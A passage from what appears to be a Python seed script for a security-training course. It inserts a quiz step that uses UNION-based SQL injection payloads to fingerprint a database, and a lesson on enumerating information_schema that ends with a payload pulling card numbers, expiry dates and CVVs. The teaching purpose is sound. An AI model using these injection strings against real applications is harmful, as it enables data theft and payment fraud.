    db.session.add(LessonStep(lesson_id=l5_2.id, order_index=1, kind="predict", title="PREDICT THE OUTPUT", prompt="An attacker runs these tests against an unknown database:\\n```\\nTest 1: ' UNION SELECT @@version--     → Returns \"13.4.0\"\\nTest 2: ' UNION SELECT version()--     → Returns \"PostgreSQL 13.4 on x86_64-pc-linux-gnu\"\\nTest 3: ' || 'test                     → Returns \"test\" (concatenation worked)\\n```\\nWhich database is the application using?", options=_opts(("A", "A) MySQL"), ("B", "B) PostgreSQL"), ("C", "C) SQL Server"), ("D", "D) Oracle")), correct_answer="B) PostgreSQL", explanation="`version()` returning \"PostgreSQL\" is the giveaway. MySQL also supports `@@version`, but the `||` concatenation and the explicit \"PostgreSQL\" in the version string confirm it.", hints=_j([])))
    l5_3 = Lesson(module_id=m5.id, order_index=3, title="Enumerating with information_schema", narrative="**Narrative**: *Most modern databases have a special metadata database called `information_schema`. It's like a phone book for the database — it lists every database, table, and column. Attackers love it.*\\n**Step-by-step enumeration (MySQL example)**:\\n**Step 1 — List all databases**:\\n**Step 2 — List tables in target database**:\\n**Step 3 — List columns in target table**:\\n**Step 4 — Extract data**:\\n💀 Full credit card details extracted.", code_snippet="' UNION SELECT card_number, expiry, cvv FROM credit_cards--", code_language="sql", table_data=None)
